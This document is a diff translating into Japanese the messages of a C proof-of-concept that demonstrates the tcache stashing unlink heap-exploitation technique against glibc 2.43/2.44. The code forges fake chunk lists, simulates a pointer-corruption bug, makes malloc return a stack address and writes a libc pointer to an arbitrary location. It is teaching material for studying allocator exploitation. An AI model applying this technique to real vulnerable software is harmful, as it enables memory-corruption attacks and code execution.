@@ -3,70 +3,70 @@
 #include<assert.h>
 
 /*
- * tcache stashing unlink attack demo 
- * PoC written by Imrane Haddaji (@tabacc0) for versions 2.43/2.44
+ * tcache stashing unlink attack のデモ
+ * PoC の作者は Imrane Haddaji (@tabacc0)、対象バージョンは 2.43/2.44
  *
- * technique credits go to the original author
+ * 技法の功績は元の作者に帰属します
 */
 
 int main(){
-	printf("This is a demonstration of the tcache stashing unlink attack\n");
-	printf("This PoC has been linked and tested against glibc 2.43-2.44 \n");
-	printf("the goal is to use the SmallBin-To-Tcache stashing mechanism to return an\n");
-	printf("arbitrary chunk , in our case , we want to return a chunk on the stack\n");
-	printf("this technique also allows us to write a libc address to an arbitrary location\n");
+	printf("これは tcache stashing unlink attack のデモンストレーションです\n");
+	printf("この PoC は glibc 2.43-2.44 に対してリンクし、テストしています \n");
+	printf("目標は、SmallBin から Tcache への stashing の仕組みを使って、\n");
+	printf("任意のチャンクを返させることです。ここではスタック上のチャンクを返させたいと考えます\n");
+	printf("この技法では、任意の場所に libc のアドレスを書き込むこともできます\n");
 
 	char * target_chunk[4] = {0};
 	char **target = &target_chunk[2];
 
-	printf("our target is : %p\n",target);
-	printf("accounting for metadata , our target's chunk address is : %p\n",target_chunk);
+	printf("ターゲット : %p\n",target);
+	printf("メタデータ分を考慮すると、ターゲットのチャンクアドレスは : %p\n",target_chunk);
 
 
-	printf("the tcache metadata chunk is allocated and initialized on the first call to \n");
-	printf("free with a Tcache size on glibc 2.43-2.44 respectively .\n,");
-	printf("(see __libc_free and tcache_free_init functions)\n");
-	printf("to avoid the tcache allocation messing with the heap layout , we will get it \n");
-	printf("done now by allocting a Tcache sized chunk and freeing it , this way it works\n");
-	printf("on both versions\n");
+	printf("tcache のメタデータのチャンクは、glibc 2.43-2.44 ではそれぞれ、Tcache サイズでの\n");
+	printf("最初の free 呼び出し時に確保・初期化されます。\n,");
+	printf("(__libc_free と tcache_free_init の各関数を参照)\n");
+	printf("tcache の確保がヒープのレイアウトを乱さないよう、今のうちに\n");
+	printf("Tcache サイズのチャンクを確保して解放しておきます。こうすると\n");
+	printf("どちらのバージョンでも動作します\n");
 	char * init_tcache = malloc(0x100);
 	free(init_tcache);
 
 
-	printf("now we allocate our victim chunk ,to avoid speding allocations filling/emptying\n");
-	printf("the Tcache,we will allocate it as a LargeBin-size chunk , put it in the unsorted");
-	printf("Bin and then cut it by allocating a chunk of a size chosen carefully to make \n");
-	printf("the remainder SmallBin-sized");
+	printf("次に被害者のチャンクを確保します。Tcache を満たしたり空にしたりする確保を\n");
+	printf("使わずに済むよう、LargeBin サイズのチャンクとして確保し、unsorted");
+	printf("Bin に入れてから、残りが\n");
+	printf("SmallBin サイズになるよう慎重に選んだサイズのチャンクを確保して切り出します");
 	char **victim = malloc(0x500);
-	printf("first after victim , we allocate a guard chunk to avoid consolidation with top\n");
+	printf("まず victim の後ろに、top との統合(consolidation)を避けるためのガードチャンクを確保します\n");
 	char *guard = malloc(0x1000);
-	printf("now we free victim , it will be put in the UnsortedBin\n");
+	printf("次に victim を解放します。victim は UnsortedBin に入ります\n");
 	free(victim);
-	printf("allocate a chunk that will be cut from from victim , the remainder size in\n");
-	printf("our case is 0x100 corresponding to malloc(0x90)\n");
+	printf("victim から切り出されるチャンクを確保します。残りのサイズは、\n");
+	printf("今回は 0x100 で、malloc(0x90) に対応します\n");
 	char *cut_victim = malloc(0x400);
-	printf("our victim has 'moved' forward when we cut it , we update the victim pointer\n");
-	printf("accordingly\n");
+	printf("切り出したことで victim は前方に「移動」したので、victim ポインタを\n");
+	printf("それに合わせて更新します\n");
 	victim = victim + 0x410/8;
 	char **victim_chunk = victim - 2;
 	char *put_smallbin = malloc(0x1000);
 
-	printf("\nnow we will create two fake chunk lists on the heap and link them together\n");
-	printf("such that they form a combined list of 15 chunks\n");
+	printf("\n次に、ヒープ上に偽のチャンクのリストを 2 つ作り、つなげます\n");
+	printf("こうして 15 個のチャンクからなる結合リストにします\n");
 
-	printf("\nnote that the tcache default bin size in 2.43/2.44 is 16 , instead of 7 from\n");
-	printf("previous versions , our target's chunk then will be the 16th chunk in the list");
+	printf("\n2.43/2.44 では tcache の bin のデフォルトサイズは、以前のバージョンの 7 ではなく\n");
+	printf("16 であることに注意してください。そのため、ターゲットのチャンクはリストの 16 番目のチャンクになります");
 
-	printf("\nthe reason we create two lists is that when malloc wills start filling the\n");
-	printf("the tcache with chunks from our list , it also starts setting the inuse bit\n");
-	printf("for those chunk , but because those chunks are fake and are just contiguous\n");
-	printf("chunk headers in memory, the inuse bit setting corrupts chunk headers ahead\n");
-	printf("in the list, this has become a problem in these versions specifically\n");
-	printf("because the tcache size has grown to 16.\n");
+	printf("\nリストを 2 つ作る理由は、malloc がリストのチャンクで\n");
+	printf("tcache を満たし始めるとき、それらのチャンクの inuse ビットも\n");
+	printf("設定し始めますが、それらのチャンクは偽物で、メモリ上に連続して並んだ\n");
+	printf("チャンクヘッダにすぎないため、inuse ビットの設定がリストの先にあるチャンクヘッダを\n");
+	printf("破壊してしまうからです。これは、これらのバージョンで特に\n");
+	printf("問題になっています。tcache のサイズが 16 に増えたためです。\n");
 
 
-	printf("we already have inactive chunks that we used for guarding and sorting, use them\n");
-	printf("as lists\n");
+	printf("ガードとソートに使った、すでに使われていないチャンクがあるので、それらを\n");
+	printf("リストとして使います\n");
 	char *(*fake_chunklist0)[4] = (char *(*)[4]) guard;
 	char *(*fake_chunklist1)[4] = (char *(*)[4]) put_smallbin;
 
@@ -78,35 +78,35 @@ int main(){
 		fake_chunklist1[i][3] = (char *) &fake_chunklist1[i+1];
 	}
 
-	printf("\nmake the last element in the combined list point to target_chunk such that it is\n");
-	printf("the 16th chunk the list\n");
+	printf("\n結合リストの最後の要素が target_chunk を指すようにして、\n");
+	printf("リストの 16 番目のチャンクになるようにします\n");
 	fake_chunklist1[7][3] = (char *) target_chunk;
 
-	printf("\nmake the fd pointer of the head of the list point to victim to bypass the \n");
-	printf("SmallBin corruption check\n");
+	printf("\nSmallBin の破壊チェックを回避するため、リストの先頭の fd ポインタが\n");
+	printf("victim を指すようにします\n");
 	fake_chunklist0[0][2] = (char *) victim_chunk;
 
-	printf("\nthen make target_chunk->bk point to target_+0x10 , this way a libc pointer will be \n");
-	printf("written to target_chunk + 0x20.\n");
+	printf("\n次に target_chunk->bk が target_+0x10 を指すようにします。こうすると libc のポインタが\n");
+	printf("target_chunk + 0x20 に書き込まれます。\n");
 	target_chunk[3] = (char *) target ;
 
 
-	printf("\n\nnow we simulate a vulnerability that will allow us to make victim->bk point to\n");
-	printf("the head of our chunk list\n");
+	printf("\n\n次に、victim->bk がチャンクリストの先頭を指すようにできる\n");
+	printf("脆弱性を模擬します\n");
 	//VULNERABILITY
 	victim_chunk[3] = (char*)fake_chunklist0[0];
 	//VULNERABILITY
 
-	printf("\ntrigger the stashing by allocating a chunk of size 0x90\n");
+	printf("\nサイズ 0x90 のチャンクを確保して stashing を引き起こします\n");
 	char *trigger_chain = malloc(0xf0);
-	printf("\nnow target_chunk , being the last element is the list, makes target in the \n");
-	printf("head of the tcache bin\n");
-	printf("the next allocation should point to target\n");
+	printf("\nこれで、リストの最後の要素である target_chunk により、target が\n");
+	printf("tcache bin の先頭に来ます\n");
+	printf("次の確保は target を指すはずです\n");
 	printf("char **tc_head = malloc(0xf0);\n");
 	char **tc_head = malloc(0xf0);
 	printf("\n\nassert(tc_head == target);\n");
 	assert(tc_head == target);
-	printf("further , target + 0x10 bytes should be a libc address:\n");
+	printf("さらに、target + 0x10 バイトは libc のアドレスになっているはずです:\n");
 	printf("\n%p\n",target[2]);
 	exit(0);
 }
